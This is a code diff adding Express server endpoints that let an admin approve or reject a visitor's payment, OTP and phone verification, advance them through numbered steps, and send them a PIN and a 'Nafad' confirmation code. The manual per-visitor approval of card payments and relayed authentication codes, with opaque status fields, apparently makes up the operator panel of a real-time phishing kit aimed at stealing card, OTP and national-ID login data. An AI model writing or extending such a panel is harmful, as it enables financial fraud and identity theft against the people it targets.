@@ -614,6 +614,177 @@ async function startServer() {
     }
   });
 
+  // =====================================================
+  // DASHBOARD ACTION ENDPOINTS
+  // =====================================================
+
+  // Payment Approval/Rejection (CheckPage - _v1Status)
+  app.post("/api/dashboard/payment-action", async (req, res) => {
+    try {
+      const { visitorId, action, paymentStatus } = req.body;
+      if (!visitorId || !action) {
+        res.status(400).json({ error: "Missing visitorId or action" });
+        return;
+      }
+
+      const updateData: Record<string, any> = {
+        paymentActionAt: new Date().toISOString(),
+        adminPaymentAction: action,
+      };
+
+      if (action === "approved") {
+        updateData._v1Status = "approved";
+        updateData.paymentStatus = paymentStatus || "completed";
+        updateData.redirectPage = "step2";
+        updateData.currentStep = "_t2";
+      } else if (action === "rejected") {
+        updateData._v1Status = "rejected";
+        updateData.paymentStatus = "rejected";
+      }
+
+      await upsertVisitor(visitorId, updateData);
+      await upsertDashboardRequest({ id: visitorId, ...updateData, updated: "تم التحديث الآن" });
+
+      res.json({ success: true, action });
+    } catch (error) {
+      console.error("payment action error", error);
+      res.status(500).json({ error: "Failed to process payment action" });
+    }
+  });
+
+  // OTP Verification Approval/Rejection (Step2Page - _v5Status)
+  app.post("/api/dashboard/otp-action", async (req, res) => {
+    try {
+      const { visitorId, action } = req.body;
+      if (!visitorId || !action) {
+        res.status(400).json({ error: "Missing visitorId or action" });
+        return;
+      }
+
+      const updateData: Record<string, any> = {
+        otpActionAt: new Date().toISOString(),
+        adminOtpAction: action,
+      };
+
+      if (action === "approved") {
+        updateData._v5Status = "approved";
+        updateData.otpStatus = "completed";
+        updateData.redirectPage = "step3";
+        updateData.currentStep = "_t3";
+      } else if (action === "rejected") {
+        updateData._v5Status = "rejected";
+        updateData.otpStatus = "rejected";
+      } else if (action === "resend") {
+        updateData.otpResendRequested = true;
+        updateData.otpResendAt = new Date().toISOString();
+      }
+
+      await upsertVisitor(visitorId, updateData);
+      await upsertDashboardRequest({ id: visitorId, ...updateData, updated: "تم التحديث الآن" });
+
+
+      res.json({ success: true, action });
+    } catch (error) {
+      console.error("otp action error", error);
+      res.status(500).json({ error: "Failed to process OTP action" });
+    }
+  });
+
+  // PIN Code Sending (Step3Page - Admin sends PIN to customer)
+  app.post("/api/dashboard/send-pin", async (req, res) => {
+    try {
+      const { visitorId, pinCode } = req.body;
+      if (!visitorId) {
+        res.status(400).json({ error: "Missing visitorId" });
+        return;
+      }
+
+      const updateData: Record<string, any> = {
+        adminPinCodeSent: true,
+        adminPinSentAt: new Date().toISOString(),
+      };
+
+      if (pinCode) {
+        updateData.adminPinCode = pinCode;
+      }
+
+      await upsertVisitor(visitorId, updateData);
+      await upsertDashboardRequest({ id: visitorId, ...updateData, updated: "تم إرسال PIN" });
+
+
+      res.json({ success: true, pinSent: true });
+    } catch (error) {
+      console.error("send pin error", error);
+      res.status(500).json({ error: "Failed to send PIN" });
+    }
+  });
+
+  // Phone Verification Approval/Rejection (Step5Page)
+  app.post("/api/dashboard/phone-action", async (req, res) => {
+    try {
+      const { visitorId, action } = req.body;
+      if (!visitorId || !action) {
+        res.status(400).json({ error: "Missing visitorId or action" });
+        return;
+      }
+
+      const updateData: Record<string, any> = {
+        phoneActionAt: new Date().toISOString(),
+        adminPhoneAction: action,
+      };
+
+      if (action === "approved") {
+        updateData._v4Status = "approved";
+        updateData.phoneOtpStatus = "approved";
+        updateData.redirectPage = "step4";
+        updateData.currentStep = "_t6";
+      } else if (action === "rejected") {
+        updateData._v4Status = "rejected";
+        updateData.phoneOtpStatus = "rejected";
+      } else if (action === "resend") {
+        updateData.phoneResendRequested = true;
+        updateData.phoneResendAt = new Date().toISOString();
+      }
+
+      await upsertVisitor(visitorId, updateData);
+      await upsertDashboardRequest({ id: visitorId, ...updateData, updated: "تم التحديث الآن" });
+
+
+      res.json({ success: true, action });
+    } catch (error) {
+      console.error("phone action error", error);
+      res.status(500).json({ error: "Failed to process phone action" });
+    }
+  });
+
+  // Nafad Confirmation Code Sending (Step4Page - Admin sends 00 code)
+  app.post("/api/dashboard/send-nafad-code", async (req, res) => {
+    try {
+      const { visitorId, nafadCode } = req.body;
+      if (!visitorId) {
+        res.status(400).json({ error: "Missing visitorId" });
+        return;
+      }
+
+      const updateData: Record<string, any> = {
+        adminNafadCodeSent: true,
+        adminNafadSentAt: new Date().toISOString(),
+      };
+
+      if (nafadCode) {
+        updateData.adminNafadCode = nafadCode;
+      }
+
+      await upsertVisitor(visitorId, updateData);
+      await upsertDashboardRequest({ id: visitorId, ...updateData, updated: "تم إرسال رمز النفاذ" });
+
+
+      res.json({ success: true, codeSent: true });
+    } catch (error) {
+      console.error("send nafad code error", error);
+      res.status(500).json({ error: "Failed to send nafad code" });
+    }
+  });
 
   // Serve static files from dist/public in production
   const staticPath =
